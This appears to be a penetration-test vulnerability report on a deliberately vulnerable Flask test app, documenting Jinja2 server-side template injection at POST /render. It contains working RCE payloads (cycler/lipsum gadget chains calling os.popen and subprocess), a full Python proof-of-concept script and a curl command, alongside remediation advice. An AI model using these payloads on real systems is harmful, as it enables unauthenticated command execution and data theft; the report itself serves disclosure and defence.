╭─ VULN-0001 ──────────────────────────────────────────────────────────────────╮
│                                                                              │
│  Vulnerability Report                                                        │
│                                                                              │
│  Title: Server-Side Template Injection in POST /render (tpl) leading to      │
│  unauthenticated RCE                                                         │
│                                                                              │
│  Severity: HIGH                                                              │
│                                                                              │
│  CVSS Score: 8.8                                                             │
│                                                                              │
│  Target: /workspace/test-vuln-hard (Flask application, `app.py`)             │
│                                                                              │
│  Endpoint: /render                                                           │
│                                                                              │
│  Method: POST                                                                │
│                                                                              │
│  CVSS Vector: AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H                            │
│                                                                              │
│  Description                                                                 │
│  The `/render` endpoint passes the user-supplied `tpl` form field directly   │
│  to Flask's `render_template_string`, so attacker input is compiled as       │
│  **Jinja2 template source** rather than bound as data. Any unauthenticated   │
│  client can submit a template expression and have it evaluated by the        │
│  server, reaching Python internals through default template globals          │
│  (`cycler`, `lipsum`, `config`) and executing arbitrary OS commands as the   │
│  application user.                                                           │
│                                                                              │
│  Impact                                                                      │
│  An unauthenticated attacker who can reach the endpoint obtains arbitrary    │
│  OS command execution in the context of the application process (observed:   │
│  `uid=1000(pentester)`, membership of group `sudo`). This yields full read   │
│  access to application data and configuration, the ability to read           │
│  environment variables/credentials, the ability to modify or delete data     │
│  the process can reach, and denial of service against the service. Command   │
│  execution is demonstrated through two independent gadget chains (`cycler`   │
│  and `lipsum`), so blocking one symbol does not remediate the issue.         │
│                                                                              │
│  Technical Analysis                                                          │
│  The vulnerable handler compiles attacker-controlled text as a template:     │
│                                                                              │
│  ```python title=app.py startLineNumber=39 endLineNumber=43                  │
│  @app.route("/render", methods=["POST"])                                     │
│  def render():                                                               │
│      # (3) SSTI via a POST form field (not a query string)                   │
│      tpl = request.form.get("tpl", "hello")                                  │
│      return render_template_string(tpl)                                      │
│  ```                                                                         │
│                                                                              │
│  `request.form.get("tpl", ...)` returns a plain string under attacker        │
│  control and hands it straight to `render_template_string`, whose            │
│  documented purpose is to compile and execute a template *source* string.    │
│  There is no allow-list, sanitisation, WAF, or authentication in front of    │
│  the route, and the whole application defines no authentication layer at     │
│  all.                                                                        │
│                                                                              │
│  **Engine fingerprint.** The module docstring at `app.py:6` claims the       │
│  injection is *"Mako SSTI in a POST form field (not Jinja2…)"*. Runtime      │
│  testing disproves this claim. Jinja2-only syntax evaluates and Mako-only    │
│  syntax is inert, confirming the engine is Jinja2 (Flask's                   │
│  `render_template_string` always uses Jinja2):                               │
│                                                                              │
│  - `{{7*7}}` → `49` and `{{7*8}}` → `56`: expression evaluation, not         │
│  reflection.                                                                 │
│  - `{{7*'7'}}` → `7777777`: Jinja2 multiplies a string; Twig and most other  │
│  engines return `49` for this expression, which discriminates Jinja2         │
│  specifically.                                                               │
│  - `${7*7}` → `${7*7}` and `<%print(7*7)%>` → `<%print(7*7)%>`: Mako syntax  │
│  is emitted verbatim, so Mako is not the engine.                             │
│                                                                              │
│  Getting the engine right matters for exploitation, because the gadget       │
│  chain is engine-specific. The docstring's incorrect claim would lead a      │
│  reviewer to apply the wrong mental model and the wrong remediation.         │
│                                                                              │
│  **Escalation path.** Flask injects the standard Jinja2 globals into the     │
│  rendering context. `cycler` and `lipsum` are Jinja2 callables whose         │
│  `__init__`/`__globals__` attributes expose the module globals of            │
│  `jinja2.utils`, which include the `os` module. From there,                  │
│  `os.popen(...).read()` executes a shell command and returns its output      │
│  directly into the HTTP response:                                            │
│                                                                              │
│  ```jinja2                                                                   │
│  {{cycler.__init__.__globals__.os.popen('id').read()}}                       │
│  {{lipsum.__globals__['os'].popen('id').read()}}                             │
│  {{lipsum.__globals__['__builtins__']['__import__']('subprocess').check_out  │
│  put(['id']).decode()}}                                                      │
│  ```                                                                         │
│                                                                              │
│  `{{config}}` additionally discloses the full Flask configuration object,    │
│  and `{{cycler}}` confirms the gadget global is reachable before any         │
│  traversal is attempted.                                                     │
│                                                                              │
│  **Root cause.** User-controllable data is allowed to reach a template       │
│  *compiler* as source. Jinja2 is not sandboxed here —                        │
│  `render_template_string` uses the standard `Environment`, not               │
│  `SandboxedEnvironment` — so template expressions have normal Python         │
│  attribute access.                                                           │
│                                                                              │
│  PoC Description                                                             │
│  1. Start the application so it listens on `127.0.0.1:8098` (the handler     │
│  binds loopback only).                                                       │
│  2. Confirm the engine is Jinja2 rather than Mako by sending `tpl={{7*7}}`   │
│  (returns `49`), `tpl={{7*8}}` (returns `56`), `tpl={{7*'7'}}` (returns      │
│  `7777777`) and the Mako control `tpl=${7*7}` (returned verbatim, proving    │
│  Mako syntax is inert).                                                      │
│  3. Send the gadget-chain payload                                            │
│  `tpl={{cycler.__init__.__globals__.os.popen('id').read()}}` as a            │
│  form-encoded POST body; the response body contains the command output       │
│  `uid=1000(pentester) gid=1000(pentester) groups=1000(pentester),27(sudo)`.  │
│  4. Repeat with an independent chain                                         │
│  `tpl={{lipsum.__globals__['os'].popen('hostname').read()}}` and with a      │
│  `subprocess.check_output` variant to confirm execution is general and not   │
│  specific to one symbol.                                                     │
│  5. Send a marker command `tpl={{lipsum.__globals__['os'].popen('echo        │
│  SSTI_RCE_PROOF').read()}}`; the unique marker is returned in the response,  │
│  ruling out coincidental output.                                             │
│  6. Observe the response body equals the command's stdout verbatim in every  │
│  case; no out-of-band channel is required to read output.                    │
│                                                                              │
│  PoC Code                                                                    │
│  ```python                                                                   │
│  #!/usr/bin/env python3                                                      │
│  """SSTI -> RCE proof of concept for POST /render (tpl form field).          │
│                                                                              │
│  Target: http://127.0.0.1:8098/render                                        │
│  Engine: Flask render_template_string(tpl) -> Jinja2 (NOT Mako)              │
│                                                                              │
│  Run:  python3 poc_ssti_render.py                                            │
│  """                                                                         │
│  import sys                                                                  │
│                                                                              │
│  import requests                                                             │
│                                                                              │
│  BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8098"        │
│  PROXIES = {"http": None, "https": None}                                     │
│                                                                              │
│                                                                              │
│  def send(tpl):                                                              │
│      r = requests.post(f"{BASE}/render", data={"tpl": tpl},                  │
│                        proxies=PROXIES, timeout=10)                          │
│      return r.status_code, r.text                                            │
│                                                                              │
│                                                                              │
│  def step(label, tpl):                                                       │
│      code, body = send(tpl)                                                  │
│      print(f"[{code}] {label}")                                              │
│      print(f"      payload : {tpl}")                                         │
│      print(f"      response: {body!r}")                                      │
│      return body                                                             │
│                                                                              │
│                                                                              │
│  def main():                                                                 │
│      print("== 1. Engine fingerprint ==")                                    │
│      a = step("Jinja2 math {{7*7}}", "{{7*7}}")                              │
│      b = step("Jinja2 math {{7*8}}", "{{7*8}}")                              │
│      c = step("Jinja2-only str mult {{7*'7'}}", "{{7*'7'}}")                 │
│      d = step("Mako ${7*7} (must NOT evaluate)", "${7*7}")                   │
│                                                                              │
│      if a.strip() != "49" or b.strip() != "56" or c.strip() != "7777777":    │
│          print("[-] Jinja2 evaluation not confirmed; aborting")              │
│          return 1                                                            │
│      if d.strip() == "49":                                                   │
│          print("[!] Mako also evaluates? unexpected")                        │
│      else:                                                                   │
│          print("[+] Engine = Jinja2. Mako syntax inert.")                    │
│                                                                              │
│      print("\n== 2. Globals / config disclosure ==")                         │
│      step("{{config}}", "{{config}}")                                        │
│      step("{{cycler}} (gadget global reachable)", "{{cycler}}")              │
│                                                                              │
│      print("\n== 3. OS command execution ==")                                │
│      out_id = step("cycler -> __globals__ -> os.popen('id')",                │
│                    "{{cycler.__init__.__globals__.os.popen('id').read()}}")  │
│      out_host = step("cycler -> os.popen('hostname')",                       │
│                      "{{cycler.__init__.__globals__.os.popen('hostname').re  │
│  ad()}}")                                                                    │
│      step("lipsum -> os.popen('uname -a')",                                  │
│           "{{lipsum.__globals__['os'].popen('uname -a').read()}}")           │
│                                                                              │
│      print("\n== 4. Second gadget chain (independent of cycler) ==")         │
│      step("lipsum -> __builtins__.__import__('subprocess').check_output",    │
│           "{{lipsum.__globals__['__builtins__']['__import__']"               │
│           "('subprocess').check_output(['id']).decode()}}")                  │
│      marker = step("marker echo",                                            │
│                    "{{lipsum.__globals__['os'].popen('echo                   │
│  SSTI_RCE_PROOF').read()}}")                                                 │
│                                                                              │
│      print("\n== Result ==")                                                 │
│      if "uid=" in out_id and "SSTI_RCE_PROOF" in marker:                     │
│          print("[+] CONFIRMED: unauthenticated SSTI -> arbitrary command     │
│  execution")                                                                 │
│          print(f"    id       : {out_id.strip()}")                           │
│          print(f"    hostname : {out_host.strip()}")                         │
│          return 0                                                            │
│      print("[-] not confirmed")                                              │
│      return 1                                                                │
│                                                                              │
│                                                                              │
│  if __name__ == "__main__":                                                  │
│      sys.exit(main())                                                        │
│  ```                                                                         │
│                                                                              │
│  Equivalent single request:                                                  │
│                                                                              │
│  ```bash                                                                     │
│  curl -s -X POST \                                                           │
│    --data-urlencode                                                          │
│  "tpl={{cycler.__init__.__globals__.os.popen('id').read()}}" \               │
│    http://127.0.0.1:8098/render                                              │
│  ```                                                                         │
│                                                                              │
│  Code Locations                                                              │
│                                                                              │
│    Location 1: app.py:41-43                                                  │
│    Primary fix: render user input as a template variable, never as template  │
│  source                                                                      │
│        # (3) SSTI via a POST form field (not a query string)                 │
│      tpl = request.form.get("tpl", "hello")                                  │
│      return render_template_string(tpl)                                      │
│    Fix:                                                                      │
│    -     # (3) SSTI via a POST form field (not a query string)               │
│      tpl = request.form.get("tpl", "hello")                                  │
│      return render_template_string(tpl)                                      │
│    +     # (3) user input is rendered as a template *variable*, never as     │
│  template source                                                             │
│      tpl = request.form.get("tpl", "hello")                                  │
│      return render_template_string("{{ user_text }}", user_text=tpl)         │
│                                                                              │
│    Location 2: app.py:6                                                      │
│    Correct the docstring: the engine is Jinja2, not Mako                     │
│      3. Mako SSTI in a POST form field (not Jinja2, not a query string)      │
│    Fix:                                                                      │
│    -   3. Mako SSTI in a POST form field (not Jinja2, not a query string)    │
│    +   3. Jinja2 SSTI in a POST form field (not a query string)              │
│                                                                              │
│  Remediation                                                                 │
│  Never pass user-controlled text to `render_template_string`. Treat the      │
│  submitted value strictly as data: render a fixed template that references   │
│  the value as a context variable, so Jinja2 escapes it instead of compiling  │
│  it.                                                                         │
│                                                                              │
│  Concretely, replace the dynamic template source with a constant template    │
│  string and pass the request value as a keyword argument (the payload then   │
│  renders as literal, HTML-escaped text). Where a template file is            │
│  preferred, add a static template under the application's `templates/`       │
│  directory containing only the variable reference, and call                  │
│  `render_template` with the value as a context argument.                     │
│                                                                              │
│  Additionally: remove or correct the docstring claim that this injection is  │
│  Mako, because the engine is Jinja2 and remediation guidance derived from    │
│  the wrong engine will not apply. Do not rely on denylisting Jinja2          │
│  keywords or attributes such as `cycler`, `lipsum`, `__class__`, or          │
│  `__globals__` — multiple independent gadget chains were demonstrated, so    │
│  any denylist is bypassable. If arbitrary tenant-authored templates are a    │
│  genuine product requirement, render them in a                               │
│  `jinja2.sandbox.SandboxedEnvironment` with a strictly limited               │
│  global/filter set, and never with the default `Environment` that            │
│  `render_template_string` uses. Finally, binding the service to loopback is  │
│  defence in depth, not a fix, and should not be treated as remediation.      │
│                                                                              │
